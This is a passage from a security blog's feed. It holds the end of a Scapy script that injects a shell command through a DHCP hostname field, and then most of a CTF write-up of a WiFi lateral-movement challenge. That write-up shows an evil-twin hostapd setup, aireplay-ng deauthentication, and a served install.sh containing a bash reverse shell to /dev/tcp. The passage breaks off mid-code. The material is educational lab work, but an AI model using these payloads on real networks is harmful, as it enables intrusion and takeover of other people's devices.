02:00:00:00:00:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     type managed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     txpower 20.00 dBm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ap </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'02:00:00:00:00:00'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># root@29a50eeb6fb5:/x# iw dev</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># phy#1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#   Interface wlan1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     ifindex 51</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     wdev 0x100000001</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     addr 02:00:00:00:01:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     type managed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     txpower 20.00 dBm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    station </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'02:00:00:00:01:00'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'id; ls /'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    inner_pkt </span><span class="token operator">=</span><span class="token plain"> Ether</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">src</span><span class="token operator">=</span><span class="token plain">station</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> UDP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dport</span><span class="token operator">=</span><span class="token number">67</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> BOOTP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">op</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> DHCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">options</span><span class="token operator">=</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'hostname'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'; </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">cmd</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> #'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    receiver </span><span class="token operator">=</span><span class="token plain"> ap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sender </span><span class="token operator">=</span><span class="token plain"> station</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    bssid </span><span class="token operator">=</span><span class="token plain"> ap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    pkt </span><span class="token operator">=</span><span class="token plain"> RadioTap</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> Dot11</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">addr1</span><span class="token operator">=</span><span class="token plain">receiver</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr2</span><span class="token operator">=</span><span class="token plain">sender</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr3</span><span class="token operator">=</span><span class="token plain">bssid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> FCfield</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'to-DS+protected'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> encrypt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">inner_pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">show</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'iw dev wlan1 interface add mon1 type monitor 2&gt;/dev/null'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'mon1'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> verbose </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'__main__'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Thanks again to SPR, the challenge authors for putting out free educational content, you guys rock 👏🏽✊🏽</p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="Turtles" term="Turtles"/>
        <category label="CTF" term="CTF"/>
        <category label="Hacking" term="Hacking"/>
        <category label="WiFi" term="WiFi"/>
        <category label="Airocrack" term="Airocrack"/>
        <category label="Salsa20" term="Salsa20"/>
        <category label="WPA2" term="WPA2"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[January 2023's Turtles Challenge]]></title>
        <id>https://www.supernetworks.org/pages/blog/january-2023-turtles</id>
        <link href="https://www.supernetworks.org/pages/blog/january-2023-turtles"/>
        <updated>2023-02-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Editor's note:]]></summary>
        <content type="html"><![CDATA[<h4 class="anchor anchorWithStickyNavbar_LWe7" id="editors-note">Editor's note:<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#editors-note" class="hash-link" aria-label="Direct link to Editor's note:" title="Direct link to Editor's note:">​</a></h4>
<p>The Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.
We first ran a challenge in this style at <a href="https://github.com/spr-networks/turtles-midnightsunctf-2022-finals" target="_blank" rel="noopener noreferrer">Stockholm's Midnight Sun CTF Finals in August '22 at the Turtles MidnightSun Finals</a>. You can play along with January's challenge, with the <a href="https://github.com/spr-networks/turtles-january-23" target="_blank" rel="noopener noreferrer">github repository</a>.</p>
<p>January's winner, <a href="https://twitter.com/itszn13" target="_blank" rel="noopener noreferrer">Amy</a> from <a href="https://ret2.io/" target="_blank" rel="noopener noreferrer">Ret2 Systems</a>, has kindly let us share their challenge writeup. Congratulations! And thanks again for putting this writeup together.</p>
<p>February's contest will be released on the 20th and we will be giving out more raspberry pis!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="intro">Intro<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#intro" class="hash-link" aria-label="Direct link to Intro" title="Direct link to Intro">​</a></h2>
<p>We find ourselves in a twisting maze of WLANs. There are 5 machines connected across several WLAN networks. We start as root on the first machine and must move laterally across the network to exfiltrate 3 flag files.  From our box we can connect to an access point with the SSID "jan-turtle1".</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/xturtles_jan-214c65df625b66cd8d02e9bc7317fc87.png" width="1503" height="633" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag-1">Flag 1<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#flag-1" class="hash-link" aria-label="Direct link to Flag 1" title="Direct link to Flag 1">​</a></h2>
<p>Our first target is also connected to the "jan-turtle1" AP over WPA3. We can assume that the target may be doing something interesting over this network, so performing a MitM attack may be fruitful. To pull this off we can use the so-called <a href="https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)" target="_blank" rel="noopener noreferrer">"Evil Twin Attack"</a> where we impersonate the AP.</p>
<p>First we need to set up our own AP with the same SSID and configuration as the existing "jan-turtle1" AP. I used <code>hostapd</code> to do this with the following config:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface=wlan2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">driver=nl80211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hw_mode=a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel=40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssid=jan-turtle1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa=2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa_key_mgmt=SAE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wpa_pairwise=CCMP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ap_isolate=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sae_password=sn0wt0rt0ise</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ip addr add dev wlan2 192.168.1.1/24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hostapd -B /root/h.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Once we have the AP up and running, clients looking for the real "jan-turtle1" AP may connect to our malicious AP instead. However the target is already connected to the existing AP, so it won't attempt to reconnect to our AP.</p>
<p>Luckily we can force it off of the original AP by abusing <a href="https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack" target="_blank" rel="noopener noreferrer">deauthentication packets</a>. If we send these packets with a spoofed target address, we cause the target to disconnect. Once the client has disconnected, there is a chance that they will reconnect to our malicious access point. We can use <a href="https://www.aircrack-ng.org/doku.php?id=aireplay-ng" target="_blank" rel="noopener noreferrer"><code>aireplay-ng</code></a> to perform this attack on a second WLAN:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ip link set dev wlan3 up</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">yes | airmon-ng start wlan3 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Start deauth on target MAC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">aireplay-ng -0 10 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan3mon &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># tcpdump -i wlan2 -v</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:09:53  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:09:53  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tcpdump: listening on wlan2, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:10:01.225272 02:00:00:00:01:00 (oui Unknown) &gt; Broadcast Null Unnumbered, xid, Flags [Response], length 6: 01 00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:10:08.879191 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.1.1 tell 192.168.1.2, length 28</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:10:08.879228 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.1.1 is-at 02:00:00:00:02:00 (oui Unknown), length 28</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">08:35:14.868587 IP (tos 0x0, ttl 64, id 18623, offset 0, flags [DF], proto TCP (6), length 60)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    192.168.1.2.49070 &gt; 192.168.1.1.http: Flags [S], cksum 0x27e2 (correct), seq 547073709, win 64240, options [mss 1460,sackOK,TS val 3350547164 ecr 0,nop,wscale 7], length 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">06:10:08.879473 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    192.168.1.1.http &gt; 192.168.1.2.49070: Flags [R.], cksum 0x9d34 (correct), seq 0, ack 547073710, win 0, length 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looks like there is a unencrypted HTTP request! Lets host our own http server using python:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># python3 -m http.server 80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">192.168.1.2 - - [15/Feb/2023 06:17:06] "GET /install.sh HTTP/1.1" 404 -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">192.168.1.2 - - [15/Feb/2023 06:17:16] code 404, message File not found</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we create our own <code>install.sh</code>, it looks like the box will run it! Lets get a reverse shell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash -i &gt;&amp; /dev/tcp/192.168.1.1/1337 0&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Nice, we captured the first flag!</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 1337</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 192.168.1.2 47550</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: cannot set terminal process group (8): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@2d419af9c243:/# cat flag1.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">turtles{0f004d8e004f4577952eda915426eac38f4df6b4}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@2d419af9c243:/#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag-2">Flag 2<a href="https://www.supernetworks.org/pages/blog/january-2023-turtles#flag-2" class="hash-link" aria-label="Direct link to Flag 2" title="Direct link to Flag 2">​</a></h2>
<p>For the second stage, we are given a binary named <a href="https://en.wikipedia.org/wiki/Wardriving" target="_blank" rel="noopener noreferrer"><code>wardriver</code></a> which is running on the second target. This binary has two main features. First it used <code>iw dev &lt;dev&gt; scan</code> to collect information on all near by access points.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">getData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">__snprintf_chk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">256LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">256LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"iw dev %s scan"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">IFACE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">fopen</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"scan.txt"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"r"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">strcpy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"cat scan.txt"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  v0 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">popen</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"r"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">insert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">v0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token function" style="color:rgb(80, 250, 123)">sqlite3_exec</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">v7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> v8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0LL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> 